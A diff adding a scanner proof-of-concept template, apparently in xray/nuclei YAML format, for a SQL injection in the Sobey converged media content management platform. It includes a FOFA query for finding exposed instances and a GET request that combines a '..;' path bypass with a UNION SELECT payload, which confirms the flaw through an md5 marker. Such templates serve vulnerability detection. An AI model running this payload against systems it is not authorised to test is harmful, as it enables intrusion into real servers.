@@ -1,0 +1,17 @@
+id: poc-yaml-sobey-imcmp-catalogarticles-sqli
+info:
+  name: 索贝融合媒体内容管理平台 catalogArticles SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /sobey-mchEditor/js/..;/count/catalogArticles?id=1)+UNION+ALL+SELECT+NULL,CONCAT(0x7e,md5({{.t1}}),0x7e),NULL,NULL,NULL,NULL%2d%2d%20%2d&siteCode=1&token=1&siteCode=1&token=1
+  expression: status_code == 200 && contains(headers,"Sobey") && !contains(body,"<")
+    && contains(body,"获取栏目列表成功") && contains(body,`~` + t2 + `~`)
+transport: http
